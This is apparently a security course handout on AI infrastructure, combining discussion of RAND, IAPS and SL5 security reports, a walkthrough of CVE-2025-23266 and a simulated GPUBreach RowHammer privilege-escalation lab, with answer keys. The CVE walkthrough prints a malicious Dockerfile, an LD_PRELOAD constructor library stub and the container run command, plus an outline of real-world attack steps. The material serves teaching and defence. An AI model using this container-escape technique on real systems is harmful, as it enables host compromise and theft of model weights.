# %%
"""
# W1D6 - Securing AI Infrastructure: From Documents to Exploits

This final day combines policy analysis, vulnerability research, and hands-on attack chain exploration to understand AI infrastructure security across multiple dimensions. You'll analyze three foundational security documents, walk through a real container escape vulnerability discovered by Wiz, and implement the complete GPUBreach attack chain.

<!-- toc -->

## Content & Learning Objectives

### 1️⃣ Document Analysis Discussion (2 hours)
Deep analysis of three foundational reports covering threat frameworks, data center security, and novel defensive approaches.

> **Learning Objectives**
> - Evaluate threat actor classifications and security level frameworks
> - Analyze critical attack vectors in AI data center environments
> - Assess implementation feasibility of next-generation security controls

### 2️⃣ CVE-2025-23266 Walkthrough (45 minutes)
Guided analysis of the NVIDIA Container Toolkit vulnerability discovered by Wiz Research, understanding the attack mechanics without hands-on exploitation.

> **Learning Objectives**
> - Understand LD_PRELOAD based container escape techniques
> - Analyze how NVIDIA Container Toolkit exposes host privileges to containers
> - Evaluate the security implications of GPU container runtime architectures

### 3️⃣ GPUBreach Attack Chain (3+ hours)
Complete implementation of a GPU-based privilege escalation chain combining RowHammer, aperture bit flipping, IOMMU bypass, and kernel exploitation.

> **Learning Objectives**
> - Execute end-to-end GPU-based attack chains
> - Understand GDDR memory vulnerabilities and exploitation techniques
> - Implement kernel privilege escalation through GPU DMA manipulation
"""

# %%
"""
## Setup

Create a file named `day6_final_answers.py` in the `day6-infrastructure` directory. This will be your answer file for today.

If you see a code snippet here in the instruction file, copy-paste it into your answer file. Keep the `# %%` line to make it a Python code cell.

**Start by pasting the code below in your day6_final_answers.py file.**
"""

# %%
"""
---

## 1️⃣ Document Analysis Discussion (2 hours)

This discussion session guides you through three foundational reports on AI infrastructure security. You'll work through specific sections of each document to understand threat frameworks, security implementations, and novel defensive approaches.

### Required Reading Materials

**Before the session, ensure you have access to:**

1. **RAND Corporation Report**: "Securing AI Model Weights" (RRA2849-1)
   - **Link**: https://www.rand.org/content/dam/rand/pubs/research_reports/RRA2800/RRA2849-1/RAND_RRA2849-1.pdf
   - **Alternative**: Search for "RAND RRA2849-1 AI model weights security"

2. **IAPS Research**: "Accelerating AI Data Center Security Research and Implementation"
   - **Link**: https://www.iaps.ai/research/accelerating-ai-data-center-security
   - **Note**: Full research findings and policy recommendations available on site

3. **SL5 Task Force**: "Novel Recommendations" (November 2025)
   - **Local File**: `./SL5_NOVEL-RECOMMENDATIONS.pdf` (in this directory)
   - **Note**: Preliminary draft with five security domain memos

### Quick Reference Guide

**Key Sections for Exercises:**

**RAND Report:**
- Operational Capability Levels (OC1-OC5): Section 2
- Security Level Framework (SL1-SL5): Section 3
- Protected Environments: Table 3-1
- Attack Vector Examples: Appendix B

**IAPS Research:**
- Three Critical Threat Areas: Main article sections 1-3
- Four Core Policy Recommendations: Conclusion section
- Side-Channel Attacks: Technical details in section 1
- Supply Chain Vulnerabilities: Section 2

**SL5 Document:**
- Supply Chain Security: Pages 8-17
- Network Security: Pages 18-31
- Machine Security: Pages 32-40
- Physical Security: Pages 41-50
- Personnel Security: Pages 51-60

### Part 1: RAND Framework - Understanding the Threat Landscape (40 minutes)

#### Exercise 1.1: Operational Capability Classification

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Task**: Open the RAND report and locate the Operational Capability (OC) classifications section.

**Questions for Group Discussion:**
1. According to RAND, what distinguishes OC4 from OC5 threat actors?
2. Which OC level can realistically compromise GPU firmware supply chains?
3. How does RAND estimate the cost difference between OC2 and OC5 operations?

**Group Exercise**: Read the attack vector examples in the RAND report and classify each scenario:

- **Scenario A**: Social engineering attack against ML researchers to steal cloud credentials
- **Scenario B**: Custom hardware implant placed during chip manufacturing
- **Scenario C**: Insider threat using legitimate access to copy model checkpoints
- **Scenario D**: Advanced persistent threat with multiple zero-day exploits

<details>
<summary><b>Answer Key (RAND Classifications)</b></summary>

- **Scenario A**: **OC2-OC3** - Requires moderate social engineering capability but limited technical resources
- **Scenario B**: **OC5** - Supply chain hardware compromise requires nation-state level access and resources
- **Scenario C**: **OC1-OC3** - Insider threats can be executed with minimal sophistication but require access
- **Scenario D**: **OC4-OC5** - Zero-day development and sophisticated persistence requires significant resources

**Key RAND Insight**: The report emphasizes that software supply chain attacks are "among the cheapest and most scalable attacks" while hardware attacks are "feasible for well-resourced nation-state attackers at OC5."

</details>

#### Exercise 1.2: Security Level Mapping

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

**Task**: Find the Security Level (SL1-SL5) framework in the RAND report.

**Analysis Questions:**
1. What are the five "protected environments" that RAND identifies?
2. At what model capability threshold does RAND suggest SL4 becomes necessary?
3. Which security level requires "classified facility-level physical security"?

**Mapping Exercise**: Based on the RAND framework, assign appropriate security levels:

| Environment | Current Practice | RAND SL Recommendation | Justification |
|-------------|-----------------|------------------------|---------------|
| Research Lab (Pre-training) | Standard enterprise security | ? | ? |
| Production Training (Frontier Model) | Enhanced cloud security | ? | ? |
| Public API Deployment | SOC 2 compliance | ? | ? |
| Internal Model Testing | Basic access controls | ? | ? |
| On-Premises Inference | Hardware security modules | ? | ? |

<details>
<summary><b>RAND Security Level Analysis</b></summary>

| Environment | RAND SL Recommendation | Justification from Report |
|-------------|------------------------|---------------------------|
| Research Lab (Pre-training) | **SL2-SL3** | Pre-publication research requires enhanced protection but not maximum security |
| Production Training (Frontier Model) | **SL4-SL5** | Highest value target requiring "classified facility-level physical security" |
| Public API Deployment | **SL3** | Deployed models need high protection but operational considerations limit SL4+ |
| Internal Model Testing | **SL3** | Internal deployment with controlled access to model capabilities |
| On-Premises Inference | **SL2-SL3** | Depends on model capability and deployment context |

**RAND Key Quote**: "SL4 can plausibly be reached incrementally, SL5 can likely only be reached by a radical reduction in the hardware and software stack that is trusted."

</details>

### Part 2: IAPS Data Center Security - Critical Attack Vectors (35 minutes)

#### Exercise 2.1: Attack Vector Prioritization

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Task**: Locate the "Three Critical Threat Areas" section in the IAPS research document.

**Reading Assignment**: Each group takes one threat area and presents to others:
- **Group A**: Side-Channel Attacks
- **Group B**: Hardware Supply Chain Vulnerabilities
- **Group C**: Model Weight Exfiltration

**Questions for Each Group:**
1. What specific technical mechanism does IAPS describe for this attack?
2. Why are AI workloads particularly vulnerable compared to traditional systems?
3. What defensive measures does IAPS recommend?

**Cross-Group Analysis**: After presentations, discuss:
- Which attack vector is most cost-effective for adversaries?
- Which is hardest to detect once deployed?
- Which requires the most sophisticated adversary capabilities?

<details>
<summary><b>IAPS Attack Vector Analysis</b></summary>

**Side-Channel Attacks:**
- **Mechanism**: Measure electromagnetic/power emissions to extract secrets
- **AI Vulnerability**: Predictable computation patterns leak encryption keys/model parameters
- **Defense**: Shielded enclosures, power filtering, algorithmic countermeasures

**Supply Chain Vulnerabilities:**
- **Mechanism**: Hardware tampering during manufacturing creates persistent backdoors
- **AI Vulnerability**: Geographic concentration of manufacturing in potentially adversarial nations
- **Defense**: Trusted supplier diversification, component verification, secure sourcing

**Weight Exfiltration:**
- **Mechanism**: High-value terabyte-scale assets transferred through various channels
- **AI Vulnerability**: Model weights are immediately executable unlike traditional IP
- **Defense**: Network monitoring, data loss prevention, air-gapped environments

**IAPS Priority**: The research emphasizes supply chain risks due to "components manufactured in China present particular risks" while acknowledging other origins may also be vulnerable.

</details>

#### Exercise 2.2: IAPS Policy Framework Implementation

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

**Task**: Find the "Four Core Policy Recommendations" in the IAPS document.

**Implementation Scenario**: Your organization operates three data centers with 15,000 GPUs total. Using the IAPS recommendations, design an implementation plan:

1. **Security Standards**: How would you implement "AI data center-specific security framework with progressive maturity levels"?
2. **R&D Investment**: What specific defensive technologies would you prioritize for DARPA-style funding?
3. **Intelligence Sharing**: What incident reporting requirements would you establish?
4. **Supply Chain Decoupling**: How quickly could you shift away from potentially compromised suppliers?

**Discussion Questions:**
- Which IAPS recommendation would have the highest immediate impact?
- Which faces the greatest implementation challenges?
- How do the IAPS recommendations align with or differ from RAND's SL framework?

<details>
<summary><b>IAPS Implementation Strategy</b></summary>

**1. Security Standards (6-12 months):**
- Map current practices to maturity model (similar to RAND SL1-SL5)
- Establish certification requirements for government procurement
- Create vendor security credential demonstration programs

**2. R&D Investment (Ongoing):**
- **Side-channel hardening**: Hardware-level countermeasures for AI accelerators
- **Supply chain security**: Component verification and trusted manufacturing
- **Exfiltration prevention**: AI-enhanced monitoring and data loss prevention

**3. Intelligence Sharing (3-6 months):**
- Mandatory incident reporting for model weight compromise
- Declassified threat intelligence sharing with private sector
- Industry threat sharing communities (currently "most breaches go unreported")

**4. Supply Chain Decoupling (2-5 years):**
- Map critical component dependencies by country of origin
- Establish trusted supplier networks in allied nations
- Create redundant sourcing for security-critical components

</details>

### Part 3: SL5 Novel Recommendations - Next-Generation Controls (35 minutes)

#### Exercise 3.1: Five-Domain Architecture Analysis

> **Difficulty**: 🔴🔴🔴🔴⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Task**: Open the SL5 document and locate the "Top 5 Recommendations" for each security domain.

**Group Assignment**: Each group analyzes one SL5 domain and identifies the most novel recommendation:

- **Group A**: Supply Chain Security - Focus on "architectural isolation and progressive access restriction"
- **Group B**: Network Security - Focus on "AI-enhanced cross-domain solutions"
- **Group C**: Machine Security - Focus on "tamper-proof enclosures that envelop entire sensitive scopes"
- **Group D**: Physical Security - Focus on "two-person integrity for all maintenance"
- **Group E**: Personnel Security - Focus on "industry-optimized sensitivity levels"

**Questions for Each Group:**
1. How does this SL5 recommendation go beyond traditional security approaches?
2. What specific technical implementation does the document suggest?
3. What are the main cost-benefit trade-offs identified?

<details>
<summary><b>SL5 Novel Recommendations Summary</b></summary>

**Supply Chain - Architectural Isolation:**
- **Innovation**: "Progressive access restriction" with systematic reduction of privileged access ("seat management")
- **Implementation**: Weight-accessing systems run minimal, formally verified components only
- **Trade-off**: Reduced functionality vs. dramatically smaller attack surface

**Network - AI-Enhanced Cross-Domain:**
- **Innovation**: AI monitors analyze code/commands crossing security boundaries
- **Implementation**: Weaker AI models monitor stronger AI outputs for suspicious patterns
- **Trade-off**: Compute overhead vs. enabling AI research workflows securely

**Machine - Tamper-Evident Enclosures:**
- **Innovation**: Physical security extended to "entire sensitive scopes" (whole racks/rooms)
- **Implementation**: Hardware detection covering complete compute environments
- **Trade-off**: Installation complexity vs. comprehensive physical protection

**Physical - Two-Person Integrity:**
- **Innovation**: All maintenance requires two authorized individuals with body-worn cameras
- **Implementation**: Continuous recording with obstruction alarms during facility access
- **Trade-off**: Operational overhead vs. insider threat elimination

**Personnel - Industry Clearances:**
- **Innovation**: Private sector adaptation of government clearance systems
- **Implementation**: "Industry-optimized sensitivity levels" with continuous behavioral monitoring
- **Trade-off**: Talent pipeline constraints vs. insider threat mitigation

</details>

#### Exercise 3.2: SL5 Implementation Feasibility Assessment

> **Difficulty**: 🔴🔴🔴🔴🔵
> **Importance**: 🔵🔵🔵🔵⚪

**Task**: Find the SL5 document's discussion of "3-6 month feasibility assessment" timeline.

**Real-World Scenario**: A major AI lab with the following characteristics wants to pursue SL5:
- 50,000+ GPUs across 5 geographic locations
- 1,000+ employee research organization
- Active training of 5+ frontier models simultaneously
- Commercial API serving 100M+ requests daily
- University research partnerships in 15+ countries

**Feasibility Questions** (refer to specific SL5 document sections):
1. **Supply Chain**: How many software dependencies would need to be eliminated based on SL5 "minimal trusted software stack" requirements?
2. **Network**: Is 100+ Tbps distributed training compatible with SL5 "network encryptor" bandwidth limitations?
3. **Personnel**: How many employees would require "industry-optimized clearances" and what's the talent pipeline impact?
4. **Physical**: What percentage of existing facilities could support "tamper-evident enclosures" without major reconstruction?
5. **Machine**: When will "hardware root of trust" be available in commercial AI accelerators?

**Group Decision**: Based on your analysis, vote on implementation timeline:
- **18 months**: Aggressive implementation with significant operational disruption
- **3-5 years**: Phased implementation aligned with hardware refresh cycles
- **5+ years**: Full implementation only with next-generation purpose-built facilities
- **Not feasible**: SL5 requirements incompatible with current AI development needs

<details>
<summary><b>SL5 Feasibility Reality Check</b></summary>

**Critical Implementation Challenges:**

**Supply Chain Reality:**
- Current ML stacks have 200+ dependencies per SL5 analysis
- "Radical reduction" requires rewriting most AI development tools
- Timeline depends on availability of formally verified alternatives

**Network Bandwidth Gap:**
- Current encryptors: 100-400 Gbps maximum throughput
- Future distributed training: 100+ Tbps requirement
- Solution requires "multiplexing currently available encryptors" with unproven scalability

**Personnel Clearance Bottleneck:**
- AI talent market extremely competitive globally
- Clearance requirements could reduce available talent pool by 70-90%
- "Industry-optimized" clearances don't yet exist

**Physical Infrastructure:**
- Most existing data centers not designed for "tamper-evident enclosures"
- Retrofit costs potentially exceed new construction
- Geographic distribution conflicts with physical security requirements

**Hardware Readiness:**
- "Hardware root of trust" in AI accelerators still developmental
- Current GPU/TPU architectures lack security-first design
- 3-5 year timeline for security-enhanced AI chips

**SL5 Assessment**: Most organizations would realistically require 5+ years for full implementation, with immediate focus on highest-impact, lowest-cost controls.

</details>

### Synthesis Exercise: Cross-Report Integration (10 minutes)

**Integration Questions:**
1. How do the RAND Security Levels (SL1-SL5) map to the IAPS policy recommendations?
2. Which SL5 novel recommendations directly address the IAPS "three critical threat areas"?
3. Where do the three frameworks contradict or provide conflicting guidance?
4. What's missing from all three reports that your organization would need to know?

**Priority Ranking Exercise**: Based on your analysis of all three documents, rank these implementation priorities:

| Priority | Recommendation | Source | Timeline | Rationale |
|----------|---------------|--------|----------|-----------|
| 1 | ? | ? | ? | ? |
| 2 | ? | ? | ? | ? |
| 3 | ? | ? | ? | ? |
| 4 | ? | ? | ? | ? |
| 5 | ? | ? | ? | ? |

---

## 2️⃣ CVE-2025-23266 Walkthrough: NVIDIA Container Toolkit Escape (45 minutes)

This section provides a guided analysis of CVE-2025-23266, the NVIDIA Container Toolkit vulnerability discovered by Wiz Research in early 2025. We'll examine the attack mechanics through Q&A rather than hands-on exploitation.

### Background: Understanding the Vulnerability

**CVE-2025-23266** is a container escape vulnerability affecting NVIDIA Container Toolkit versions through 1.17.7. The vulnerability allows malicious container images to execute arbitrary code on the host system with root privileges through an LD_PRELOAD attack vector.

**Key Resources:**
- **Wiz Research Blog**: https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape
- **NVIDIA Security Bulletin**: NVIDIA Container Toolkit Advisory
- **CVE Details**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-23266

### Exercise 2.1: Attack Vector Analysis

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Question 1**: How does the NVIDIA Container Toolkit create a trusted execution environment for GPU-enabled containers?

<details>
<summary>Answer</summary>

The NVIDIA Container Toolkit (`nvidia-ctk`) acts as a bridge between Docker containers and NVIDIA GPU drivers on the host. When a container requests GPU access with `--gpus=all` or `--runtime=nvidia`, the toolkit:

1. **Device Discovery**: Scans the host for available NVIDIA GPUs and driver libraries
2. **Mount Preparation**: Identifies which host GPU devices, libraries, and binaries need to be mounted into the container
3. **Runtime Configuration**: Modifies the container's runtime environment to include GPU access paths
4. **Privilege Escalation**: Executes with elevated privileges to access hardware and modify container namespaces

The critical security assumption is that **only trusted container images** will be executed with GPU access, as the toolkit must run privileged operations on the host during container setup.

</details>

**Question 2**: What is the LD_PRELOAD mechanism and why is it particularly dangerous in containerized environments?

<details>
<summary>Answer</summary>

**LD_PRELOAD** is a Linux environment variable that forces the dynamic linker to load specified shared libraries before any others, effectively allowing library function interception and replacement.

**In containerized environments, LD_PRELOAD becomes dangerous because:**

1. **Cross-boundary execution**: When host binaries execute with LD_PRELOAD set from a container context, the preloaded library can execute arbitrary code
2. **Privilege inheritance**: Host processes that run with elevated privileges will execute the preloaded code with those same privileges
3. **Steganographic hiding**: Malicious libraries can be embedded within seemingly legitimate container images
4. **Persistent infection**: LD_PRELOAD can affect multiple host process executions, not just the initial container runtime

**CVE-2025-23266 Specific**: The NVIDIA Container Toolkit executes host binaries (like `nvidia-ctk`) with LD_PRELOAD environment variables inherited from the container, allowing malicious shared libraries to execute on the host with root privileges.

</details>

**Question 3**: Walk through the complete attack chain for CVE-2025-23266. What are the key steps an attacker must perform?

<details>
<summary>Attack Chain Breakdown</summary>

**Step 1: Malicious Container Preparation**
```dockerfile
FROM ubuntu:22.04
ENV LD_PRELOAD=/proc/self/cwd/malicious.so
ADD malicious.so /
# Container appears legitimate but includes malicious shared library
```

**Step 2: Shared Library Weaponization**
```c
// malicious.c - compiled to malicious.so
void __attribute__((constructor)) init() {
    // Code here executes when library loads
    // Can perform privilege escalation, data exfiltration, etc.
    system("echo 'compromised' > /tmp/evidence");
}
```

**Step 3: Container Execution with GPU Access**
```bash
docker run --rm --runtime=nvidia --gpus=all malicious-image
```

**Step 4: Toolkit Execution with Inherited Environment**
- Docker daemon calls `nvidia-ctk` on host to configure GPU access
- `nvidia-ctk` inherits `LD_PRELOAD=/proc/self/cwd/malicious.so` from container environment
- Host resolves `/proc/self/cwd/` to the container's working directory
- `nvidia-ctk` loads `malicious.so` and executes constructor function **with root privileges on the host**

**Step 5: Host Compromise**
- Malicious code now executes outside container boundaries
- Can install backdoors, access host filesystem, escalate privileges permanently
- Attack succeeded: container escaped to host root

</details>

### Exercise 2.2: Defense Analysis and Mitigation

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

**Question 4**: Why didn't traditional container security measures (namespaces, cgroups, seccomp) prevent this attack?

<details>
<summary>Answer</summary>

**Traditional container security operates at different layers:**

1. **Namespaces**: Isolate process, network, filesystem views within the container but don't control host process execution
2. **Cgroups**: Limit resource usage (CPU, memory) but don't restrict environment variable inheritance
3. **Seccomp**: Filters system calls within the container but `nvidia-ctk` execution happens on the host

**CVE-2025-23266 bypasses these because:**

- The vulnerable code path occurs in **host processes** (`nvidia-ctk`), not container processes
- Environment variable inheritance is a **legitimate Docker feature** required for GPU toolkit functionality
- The attack doesn't require container breakout through syscalls or namespace violations
- Host privilege escalation happens through **legitimate shared library loading**, not exploiting kernel vulnerabilities

**Key insight**: Container runtimes that execute host utilities with elevated privileges create new attack surfaces beyond traditional container isolation.

</details>

**Question 5**: What specific mitigations did NVIDIA implement in the patched version, and what are the broader lessons for container runtime security?

<details>
<summary>Mitigation Analysis</summary>

**NVIDIA's Specific Fixes (v1.17.8+):**

1. **Environment Sanitization**: `nvidia-ctk` now filters dangerous environment variables including `LD_PRELOAD` before execution
2. **Path Validation**: Stronger validation of library paths to prevent `/proc/self/cwd/` resolution tricks
3. **Execution Context Isolation**: Separate the runtime environment of host toolkit execution from container environment inheritance

**Broader Container Runtime Lessons:**

1. **Minimize Host Execution**: Container runtimes should minimize the need for privileged host process execution
2. **Environment Isolation**: Host utilities should never inherit untrusted environment variables from containers
3. **Principle of Least Privilege**: GPU access shouldn't require full root privileges for toolkit execution
4. **Secure Defaults**: Container runtimes should whitelist safe environment variables rather than blacklisting dangerous ones

**Architectural Recommendations:**

- **Hardware-isolated GPU sharing**: Technologies like SR-IOV and MIG reduce the need for privileged host toolkit execution
- **Sandboxed runtimes**: gVisor, Kata Containers provide stronger isolation between container and host execution contexts
- **Device plugins**: Kubernetes device plugins can manage GPU resources without runtime privilege escalation

</details>

**Question 6**: How would an attacker discover and exploit this vulnerability in a real-world scenario?

<details>
<summary>Real-World Attack Scenario</summary>

**Discovery Phase:**
1. **Version enumeration**: Attacker determines NVIDIA Container Toolkit version through Docker API queries or container runtime errors
2. **Environment testing**: Deploy test containers to understand environment variable inheritance behavior
3. **Privilege mapping**: Identify which host processes execute during GPU container initialization

**Exploitation Development:**
1. **Payload crafting**: Develop shared library with persistence, data exfiltration, or lateral movement capabilities
2. **Container disguise**: Create legitimate-looking container image (ML training, gaming, crypto mining) that includes malicious library
3. **Social engineering**: Convince targets to run the container for "GPU performance testing" or "algorithm optimization"

**Attack Execution:**
1. **Registry poisoning**: Upload malicious container to public or private registries with enticing descriptions
2. **Supply chain insertion**: Compromise legitimate container build processes to inject malicious libraries
3. **Insider deployment**: Use legitimate access to deploy malicious containers in enterprise environments

**Post-Exploitation:**
1. **Persistence establishment**: Install backdoors, create new user accounts, modify system configurations
2. **Lateral movement**: Discover other systems with GPU infrastructure, expand container deployment
3. **Data exfiltration**: Access model weights, training data, or other sensitive AI assets stored on compromised hosts

**Real Impact**: This vulnerability was particularly dangerous because GPU-enabled containers are commonly deployed for ML training and inference in high-value environments with sensitive AI models.

</details>

### Exercise 2.3: Broader Implications for AI Infrastructure Security

> **Difficulty**: 🔴🔴🔴🔴⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Discussion Questions:**

1. **Trust Boundaries**: How does CVE-2025-23266 challenge assumptions about trust boundaries in GPU-enabled containerized AI workloads?

2. **Supply Chain Risk**: What are the implications for AI model development when container images can compromise training infrastructure?

3. **Detection Challenges**: Why would traditional security monitoring struggle to detect this type of container escape?

4. **Policy Impact**: How should this vulnerability influence organizational policies around third-party container usage in AI development environments?

<details>
<summary>Discussion Framework</summary>

**Trust Boundary Analysis:**
- Traditional assumption: Container isolation provides sufficient security for multi-tenant GPU sharing
- Reality: GPU runtime requirements create privileged host execution paths that bypass container isolation
- Implication: GPU-enabled containers should be treated as trusted workloads requiring stronger vetting

**Supply Chain Considerations:**
- Container registries become critical security infrastructure for AI development
- Need for signature verification, image scanning, and provenance tracking for GPU-enabled containers
- Risk of compromised training environments leading to model backdooring or data poisoning

**Detection Challenges:**
- Host process execution appears legitimate (nvidia-ctk running normally)
- No unusual container behavior or resource consumption
- Requires monitoring of shared library loading and environment variable inheritance

**Organizational Policy Recommendations:**
- Restrict GPU container execution to signed, audited images only
- Implement least-privilege GPU access (MIG, device plugins) to reduce host toolkit execution
- Monitor and log all GPU container deployments with enhanced scrutiny
- Regular security updates for container runtime components, not just application containers

</details>

---

## 3️⃣ GPUBreach Attack Chain: RowHammer to Root (3+ hours)

In this lab you will walk through the *GPUBreach* attack chain end-to-end against a simulated GDDR6 + NVIDIA-style driver stack. The chain fuses several well-known primitives into a single full-system compromise:

1. A **RowHammer** bit flip in GPU DRAM corrupts the **aperture bit** of a GPU page-table entry, silently redirecting the page from local VRAM to host system memory.
2. The next GPU DMA against that virtual address crosses PCIe into a **driver-managed DMA buffer** on the CPU side.
3. An **out-of-bounds write** in the driver's fast path allows the DMA payload to overflow the buffer into an **adjacent kernel credential struct**.
4. The attacker sets their `euid` to 0 and escalates to **root** — with the IOMMU enabled the whole time.

Everything runs inside `gpubreach_sim/`, a small Python package that models GDDR6 rows, GPU PTEs, an IOMMU, and a driver page. You will *not* modify the simulator. You will implement the chain from the outside, in small steps, exactly the way a real attacker drives the attack against a kernel.

The lab is structured as **many bite-sized exercises**, each with a test you can run to know you got it right. It is split into:

- **Phase 1 — Understanding** (30 min, no code): four comprehension questions that explain what's going on before you start writing code.
- **Phase 2 — Must-finish track** (~30–45 min): five tiny coding exercises, one per step of the chain. Together they drive the attack from bit flip to printed flag.
- **Phase 3 — Stretch track** (as much time as you have): seven optional bite-sized exercises that dig deeper into the primitives.
- **Phase 4 — Debrief** (15 min): four open discussion questions.

If you only complete Phase 1 + Phase 2, you have seen a full GPUBreach chain from bit flip to root. The stretch exercises are a menu — pick what interests you, skip what doesn't. They are all short.

**Recommended reading (before the lab):**

- Jattke et al., *[GPUHammer: Rowhammer Attacks on GPU Memories are Practical](https://gpuhammer.com/)* (USENIX Security 2025)
- Kim et al., *[Flipping Bits in Memory Without Accessing Them](https://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf)* (the original RowHammer paper)
- Seaborn & Dullien, *[Exploiting the DRAM rowhammer bug to gain kernel privileges](https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)* (Project Zero's CPU-side PTE-flip exploit, the direct ancestor of the aperture-flip idea used by GPUBreach)

### Phase 1 — Understanding the chain (no code, 30 minutes)

Four short comprehension questions on the four primitives the chain stitches together. You answer them in your answers file.

> **Learning Objectives**
> - Explain DRAM row organisation and the RowHammer activation threshold
> - Describe the layout of a GPU PTE and the role of the aperture bit
> - Argue precisely why the IOMMU does not block this DMA write
> - Trace how a driver OOB write turns into a privilege escalation

### Phase 2 — Must-finish: driving the attack to root

Exactly five bite-sized coding exercises, each with a test — one per step of the chain. Together they bit-flip a PTE, re-walk it through the GPU MMU, and DMA an oversized payload into a kernel cred struct to get root.

> **Learning Objectives**
> - Compute aggressor rows for double-sided hammering
> - Drive the hammer loop in cycle-accurate terms
> - Force the GPU MMU to pick up the corrupted entry
> - Craft a payload that exploits an intra-page OOB
> - Observe an end-to-end privilege escalation

### Phase 3 — Stretch: digging into the primitives

Optional short exercises: decode PTEs by hand, inspect the flipped bit, budget the hammer timing, prove the IOMMU does exactly what it claims (and no more), and craft tighter payloads.

> **Learning Objectives**
> - Work with PTE byte layouts at the bit level
> - Reason about hammer economics under refresh constraints
> - Distinguish IOMMU page-level enforcement from sub-page bounds checking
> - Understand why the cred struct sits where the attack needs it

### Phase 4 — Debrief (discussion)

Open-ended questions linking the lab back to real-world attack timing, ECC protection, IOMMU limits, and how an attacker would find the target PTE row without privileged access.
"""

# %%
"""
**Start the GPUBreach portion by importing the simulator and running the full instruction set from the original GPUBreach solution file:**
"""

# Import the GPUBreach simulator
import sys
from collections.abc import Callable
from pathlib import Path

for _path in [
    str(Path(__file__).resolve().parent),
    str(Path(__file__).resolve().parent.parent),
]:
    if _path not in sys.path:
        sys.path.insert(0, _path)

from aisb_utils import report
from gpubreach_sim import *

# %%
"""
## Initial environment inspection

Start by creating an environment and inspecting the initial state to understand what we're working with.
"""

env = make_environment()

print("── Initial GPUBreach environment ──")
print(f"  PTE victim row      = {PTE_ROW} (DRAM row holding the target PTE)")
print(f"  PTE offset in row   = {PTE_OFFSET_IN_ROW} bytes from row start")
print(f"  GPU virtual address = 0x{VICTIM_GPU_VADDR:x} "
      f"(resolves via the PTE we'll corrupt)")
print(f"  PTE aperture        = {env.victim_pte.aperture} "
      f"(0 = GPU VRAM, 1 = system memory)")
print(f"  Kernel euid         = {env.kernel_cred.euid} "
      f"(0 would mean root)")
print(f"  Hammer threshold    = {HAMMER_THRESHOLD_ACTIVATIONS:,} "
      f"activations per aggressor")
print(f"  ACTIVATE-PRECHARGE  = {ACTIVATE_PRECHARGE_NS} ns")
print(f"  Refresh window      = {REFRESH_WINDOW_MS} ms")
print(f"  Driver buffer size  = {DRIVER_BUFFER_SIZE} bytes "
      f"(cred struct at offset {CRED_OFFSET} in a {PAGE_SIZE} byte page)")


# %%
"""
## Simulator cheat sheet

The `gpubreach_sim` package is the simulated target — you will never edit
it, you will only *call into it* from your answers file. This cheat sheet
lists every symbol you'll touch, so you can refer back instead of hunting
through the imports.

**Entry points**

- `make_environment() -> Environment` — build a fresh target. Re-run any
  time you want a clean slate (useful between failed attempts).
- `env = make_environment()` — the `Environment` you'll mutate across the
  chain.
- `env.check_all()` — print a stage-by-stage report and, if all four
  stages succeeded, the flag.

**Attacker knowledge (constants you use as-is)**

- `PTE_ROW` — DRAM row holding the victim PTE (Page Table Entry).
- `PTE_OFFSET_IN_ROW` — byte offset of the PTE inside that row.
- `VICTIM_GPU_VADDR` — GPU virtual address whose PTE we corrupt.
- `FLAG` — the success flag (printed by `env.check_all()` on success).

**DRAM primitives** — on `env.dram` (class `DRAM`):

- `env.dram.hammer_once(aggressor_a, aggressor_b) -> int` — one round of
  double-sided hammering; returns the nanoseconds it cost. Only leaks
  charge into the victim row when `|a - b| == 2`.
- `env.dram.has_flipped(victim_row) -> bool` — True once a flip has
  landed in that row.
- `env.dram.read(row, offset, length) -> bytes` — read raw bytes from
  DRAM (used in the stretch track).
- `HAMMER_THRESHOLD_ACTIVATIONS`, `ACTIVATE_PRECHARGE_NS`,
  `REFRESH_WINDOW_MS`, `ROW_SIZE_BYTES`, `ROWS_PER_BANK` — DRAM
  parameters.

**GPU page-table primitives** — on `env.page_table` (class
`GPUPageTable`):

- `env.page_table.cached_pte` — the live PTE the GPU MMU is using. Has
  fields `.valid`, `.aperture`, `.physical_frame`.
- `env.page_table.sync_from_dram(env.dram)` — re-read the PTE from DRAM
  (models a TLB miss / invalidation).
- `APERTURE_GPU_LOCAL` (= 0), `APERTURE_SYSTEM` (= 1), `APERTURE_BIT_POS`
  (= 1), `PTE_BYTES` (= 8) — PTE layout constants.

**Driver / DMA primitives**

- `perform_gpu_dma(data, gpu_vaddr, page_table, iommu, gpu_dram,
  driver_page)` — the vulnerable driver fast path. Translates `gpu_vaddr`
  through the page table and performs the DMA. No length clamp.
- `env.iommu.validate(target_page, offset, length) -> bool` — probe the
  IOMMU's decision without actually performing a DMA (used in stretch
  3.5).
- `env.driver_page` — the host DMA-mapped page (class `DriverPage`).
- `env.kernel_cred.is_root() -> bool` — True iff the cred struct's euid
  is 0.
- `DRIVER_BUFFER_SIZE` (= 128), `CRED_OFFSET` (= 128), `PAGE_SIZE`
  (= 4096) — layout of the driver page.

Every call above is backed by a short docstring inside `gpubreach_sim/`
if you want to see what it does exactly.
"""


# %%
"""
## 1️⃣ Phase 1 — Understanding (30 min, no code)

Read each of the four comprehension exercises below and answer the
questions (plain-text comments in your answers file are fine). The
collapsed reference answers are there for when you finish, not to short-
circuit your thinking.

### Exercise 1.1: DRAM row organisation and the RowHammer threshold

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

A DRAM bank is a 2D grid of capacitor cells: rows of DRAM cells share a
single **row buffer**. Issuing an `ACTIVATE` copies a whole row into that
buffer. `PRECHARGE` closes the row. Every `ACTIVATE` perturbs
